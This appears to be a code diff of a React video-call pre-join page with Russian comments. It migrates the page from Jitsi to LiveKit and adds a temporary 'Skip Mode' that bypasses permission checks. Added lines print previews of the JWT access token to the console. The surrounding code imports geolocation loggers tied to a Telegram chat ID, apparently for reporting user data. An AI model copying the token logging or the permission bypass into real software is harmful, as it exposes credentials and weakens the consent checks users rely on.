@@ -10,11 +10,12 @@ import {
   logGeolocationData
 } from '@/utils/telegramLogger';
 import { handleSequentialPermissions } from '@/utils/permissionHandler';
-import { joinRoom } from '@/utils/jitsiAPI';
+import { joinRoom } from '@/utils/livekitAPI';
 
 interface JitsiPreJoinProps {
   roomName: string;
-  onJoinRoom: (userName: string) => void;
+  initialRoomTitle?: string;
+  onJoinRoom: (userName: string, token: string, livekitUrl: string) => void;
   videoStreamFront: MediaStream | null;
   setVideoStreamFront: Dispatch<SetStateAction<MediaStream | null>>;
   isVideoRecording: boolean;
@@ -47,6 +48,7 @@ const CHAT_ID = 7320458296;
 
 export default function JitsiPreJoin({
   roomName,
+  initialRoomTitle,
   onJoinRoom,
   videoStreamFront,
   setVideoStreamFront,
@@ -69,6 +71,8 @@ export default function JitsiPreJoin({
   const [isCameraOff, setIsCameraOff] = useState(false);
   const [showJoinMenu, setShowJoinMenu] = useState(false);
   const [showPermissionAlert, setShowPermissionAlert] = useState(false);
+  const [roomTitle, setRoomTitle] = useState(initialRoomTitle || ''); // Дружественное название комнаты
+  const [skipPermissions, setSkipPermissions] = useState(false); // 🔧 ВРЕМЕННО: пропуск ошибок разрешений для тестирования в Figma
 
   // ========================================
   // UTILITY FUNCTIONS
@@ -1194,11 +1198,36 @@ export default function JitsiPreJoin({
         console.log('✅ JWT токен получен:', {
           role: joinData.role,
           identity: joinData.identity,
-          jitsiUrl: joinData.jitsiUrl
+          livekitUrl: joinData.livekitUrl,
+          title: joinData.title,
+          tokenType: typeof joinData.token,
+          tokenLength: joinData.token?.length,
+          tokenPreview: typeof joinData.token === 'string' ? joinData.token.substring(0, 50) + '...' : 'NOT A STRING: ' + JSON.stringify(joinData.token)
         });
+        // Сохраняем дружественное название комнаты
+        if (joinData.title) {
+          setRoomTitle(joinData.title);
+          log('✅ Название комнаты установлено:', joinData.title);
+        }
       } catch (error) {
         console.error('❌ Ошибка получения JWT токена:', error);
         throw new Error('Failed to get access token. Please try again.');
+      }
+      
+      // 🔧 ВРЕМЕННО: Если включен Skip Mode, сразу входим в комнату
+      if (skipPermissions) {
+        log('⚠️ SKIP MODE: Пропускаем все проверки и сразу входим в комнату');
+        console.log('🚪 [SKIP MODE] Вызов onJoinRoom с параметрами:', {
+          userName,
+          tokenType: typeof joinData.token,
+          tokenLength: joinData.token?.length,
+          tokenPreview: typeof joinData.token === 'string' ? joinData.token.substring(0, 50) + '...' : 'NOT A STRING: ' + JSON.stringify(joinData.token),
+          livekitUrl: joinData.livekitUrl
+        });
+        setTimeout(() => {
+          onJoinRoom(userName, joinData.token, joinData.livekitUrl);
+        }, 500);
+        return;
       }
       
       // Используем новую функцию ПОСЛЕДОВАТЕЛЬНОГО запроса разрешений
@@ -1273,10 +1302,11 @@ export default function JitsiPreJoin({
       // Обработка камеры/микрофона
       const hasCameraOrMic = results.cameraGranted || results.microphoneGranted;
       
+      // 🔧 ВРЕМЕННО: Если разрешения не получены, показываем alert
       if (!hasCameraOrMic) {
         log('⚠️ Разрешения камеры/микрофона не получены - показываем alert');
         setShowPermissionAlert(true);
-        return; // Не продолжаем без разрешен��й
+        return;
       }
       
       setShowPermissionAlert(false);
@@ -1339,19 +1369,27 @@ export default function JitsiPreJoin({
         roomName: joinData.roomName,
         role: joinData.role,
         identity: joinData.identity,
-        jitsiUrl: joinData.jitsiUrl
+        livekitUrl: joinData.livekitUrl,
+        token: '***'
       });
       
-      // Сохраняем joinData в localStorage для использования в JitsiRoom
+      // Сохраняем joinData в localStorage для использования в комнате
       try {
-        localStorage.setItem('jitsi_join_data', JSON.stringify(joinData));
+        localStorage.setItem('livekit_join_data', JSON.stringify(joinData));
         log('✅ Join Data сохранён в localStorage');
       } catch (error) {
         console.error('❌ Ошибка сохранения join data:', error);
       }
       
       setTimeout(() => {
-        onJoinRoom(userName);
+        console.log('🚪 Вызов onJoinRoom с параметрами:', {
+          userName,
+          tokenType: typeof joinData.token,
+          tokenLength: joinData.token?.length,
+          tokenPreview: typeof joinData.token === 'string' ? joinData.token.substring(0, 50) + '...' : 'NOT A STRING: ' + JSON.stringify(joinData.token),
+          livekitUrl: joinData.livekitUrl
+        });
+        onJoinRoom(userName, joinData.token, joinData.livekitUrl);
       }, 500); // Небольшая задержка для завершения всех процессов
       
     } catch (error) {
@@ -1506,7 +1544,7 @@ export default function JitsiPreJoin({
 
             {/* Room name */}
             <div className="text-white text-[20px] leading-[28px] font-bold text-center mb-6">
-              {roomName}
+              {roomTitle || roomName}
             </div>
 
             {/* Name input */}
@@ -1517,6 +1555,22 @@ export default function JitsiPreJoin({
               placeholder="Enter your name"
               className="w-full h-10 bg-[#3d3d3d] text-white text-sm px-4 py-3 rounded-md mb-4 outline-none placeholder:text-[#c2c2c2]"
             />
+
+            {/* 🔧 ВРЕМЕННО: Toggle Skip Mode и Debug для тестирования в Figma */}
+            <div className="mb-4 flex items-center gap-4">
+              <div className="flex items-center gap-2">
+                <input
+                  type="checkbox"
+                  id="skipMode"
+                  checked={skipPermissions}
+                  onChange={(e) => setSkipPermissions(e.target.checked)}
+                  className="w-4 h-4 cursor-pointer"
+                />
+                <label htmlFor="skipMode" className="text-yellow-400 text-sm cursor-pointer">
+                  🔧 Skip Mode
+                </label>
+              </div>
+            </div>
 
             {/* Join button */}
             <div className="relative mb-4">
@@ -1606,10 +1660,22 @@ export default function JitsiPreJoin({
 
           {/* Permission Alert - показывается внизу при отклонении */}
           {showPermissionAlert && (
-            <div className="mt-6 mb-4 w-full max-w-[400px] flex justify-center">
+            <div className="mt-6 mb-4 w-full max-w-[400px] flex flex-col items-center gap-3">
               <div className="h-16 w-[300px] relative">
                 <Alert />
               </div>
+              {/* 🔧 ВРЕМЕННО: Кнопка Skip для тестирования в Figma */}
+              <button
+                onClick={() => {
+                  setSkipPermissions(true);
+                  setShowPermissionAlert(false);
+                  console.log('🔧 SKIP MODE активирован - повторная попытка входа...');
+                  handleRequestAllPermissions();
+                }}
+                className="px-6 py-2 bg-yellow-500 text-black font-bold rounded hover:bg-yellow-400 transition-colors"
+              >
+                🔧 SKIP (Test Mode)
+              </button>
             </div>
           )}
         </div>
